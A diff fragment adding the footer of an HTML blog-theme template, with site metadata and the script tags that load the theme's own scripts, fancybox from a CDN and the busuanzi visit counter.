+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
